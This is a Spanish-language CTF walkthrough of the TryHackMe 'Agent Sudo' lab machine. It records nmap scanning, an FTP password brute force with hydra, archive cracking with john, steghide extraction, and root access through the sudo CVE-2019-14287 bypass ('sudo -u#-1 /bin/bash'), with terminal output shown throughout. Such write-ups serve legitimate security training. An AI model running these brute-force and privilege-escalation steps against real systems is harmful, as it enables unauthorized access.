---
title: Agent Sudo CTF TryHackMe
date: 2020-12-03
categories: [CTF, TryHackMe]
tags: [ctf, tryhackme]     # TAG names should always be lowercase
---
# Agent Sudo
## Información

Agent Sudo se trata de una máquina de TryHackMe de dificultad fácil y creada por Deskel. Se expone la información siguiente: "You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth". Se debe sacar la flag user.txt y root.txt.
![tarjeta_agent_sudo](/assets/img/sample/Tarjeta_Agent_Sudo.png)

## Enumeración 
```terminal
kali@kali:~$ nmap -sC -sV 10.10.94.186
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-03 13:29 EST
Nmap scan report for 10.10.94.186
Host is up (0.079s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Se pueden destacar 3 puertos abiertos: 21 (ftp), 22 (ssh) y 80 (http). Accedemos a la web en el puerto 80. Se muestra el siguiente mensaje:
![web_mensaje1](/assets/img/sample/web1.png)

Para cambiar nuestro user-agent podemos usar burpsuite o una extensión al navegador. La solicitud de cabecera del user-agent contiene una cadena característica que permite identificar el protocolo de red  que ayuda a descubrir  el tipo de aplicación, sistema operativo, proveedor del software o la versión del software de la petición del agente de usuario.
Al cambiar nuestro user-agent a C, muestra el siguiente mensaje:

![web_mensaje2](/assets/img/sample/web2.png)

## Explotación

Seguidamente podemos hacer un brute force al servicio ftp en el puerto 21 con el usuario chris. Por ejemplo con la herramienta hydra, con la wordlist rockyou.txt.

```terminal
kali@kali:~$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.94.186 ftp
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-12-03 13:42:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.94.186:21/
[STATUS] 230.00 tries/min, 230 tries in 00:01h, 14344169 to do in 1039:26h, 16 active
[21][ftp] host: 10.10.94.186   login: chris   password: *******
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-03 13:43:43
```

Al ingresar en el ftp nos encontramos con 3 archivos: To_agentJ.txt, cute-alien.jpg, cutie.png.

```terminal
kali@kali:~$ ftp 10.10.94.186
Connected to 10.10.94.186.
220 (vsFTPd 3.0.3)
Name (10.10.94.186:kali): chris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget To_agentJ.txt?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
226 Transfer complete.
217 bytes received in 0.00 secs (217.3478 kB/s)
mget cute-alien.jpg?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
226 Transfer complete.
33143 bytes received in 0.05 secs (705.2538 kB/s)
mget cutie.png?
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
226 Transfer complete.
34842 bytes received in 0.05 secs (744.3589 kB/s)
```

En To_agentJ.txt aparece el siguiente mensaje: 

```terminal
kali@kali:~$ cat To_agentJ.txt
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
``` 

Podemos darnos cuenta que en alguna foto estará oculta la contraseña. Para ello usaremos la herramienta binwalk.

```terminal
kali@kali:~$ binwalk -e cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

Encontramos un archivo comprimido. Donde hay: 

```terminal
kali@kali:~/Agent/_cutie.png.extracted$ ls
365  365.zlib  8702.zip  To_agentR.txt
```
Pero estan protegidos con una contraseña. Usamos la herramienta zip2john y john para conseguir la contraseña: 

```terminal
kali@kali:~/Agent/_cutie.png.extracted$ sudo zip2john 8702.zip > hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
kali@kali:~/Agent/_cutie.png.extracted$ sudo john hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:00 DONE 2/3 (2020-12-03 14:06) 1.219g/s 53643p/s 53643c/s 53643C/s 123456..Peter
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Después de esto podemos acceder al archivo To_agentR.txt:

```terminal
kali@kali:-$cat To_agentR.txt
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Se puede apreciar que 'QXJlYTUx' esta en base64, descodificando obtenemos:

```terminal
kali@kali:~/Agent/_cutie.png.extracted$ echo QXJlYTUx | base64 -d; echo ""
******

```

Esta credencial puede ser de la otra imagen como passphrase. Con la herramienta steghide obtendremos la información oculta. Obtenemos: 

```terminal
kali@kali:~$ steghide extract -sf  cute-alien.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!
kali@kali:~$ steghide extract -sf  cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".
kali@kali:~$ cat message.txt
Hi james,

Glad you find this message. Your login password is ************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

Después de esto podemos loguearnos en ssh con el usuario de james.

```terminal
kali@kali:~$ ssh james@10.10.94.186
james@10.10.94.186's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  3 19:16:32 UTC 2020

  System load:  0.0               Processes:           94
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 33%               IP address for eth0: 10.10.94.186
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ ls -a
.  ..  Alien_autospy.jpg  .bash_history  .bash_logout  .bashrc  .cache  .gnupg  .profile  .sudo_as_admin_successful  user_flag.txt
james@agent-sudo:~$ cat user_flag.txt
********************************
```

Ya tenemos user.txt

## Escalación de privilegios

Si hacemos sudo -l podemos darnos cuenta de un fallo.
```terminal
james@agent-sudo:~$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

Se trata del CVE-2019-14287. Sudo no verifica la existencia de la identificación de usuario especificada y ejecuta la identificación de usuario arbitraria con el sudo priv -u # -1 devuelve 0, que es la identificación de root y / bin / bash se ejecuta con permiso de root.

Para explotarlo ejecutamos: sudo -u#-1 /bin/bash,y obtenemos root.txt

```terminal
root@agent-sudo:/# cd root/ && cat root.txt
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.

Your flag is
********************************

By,
DesKel a.k.a Agent R

```


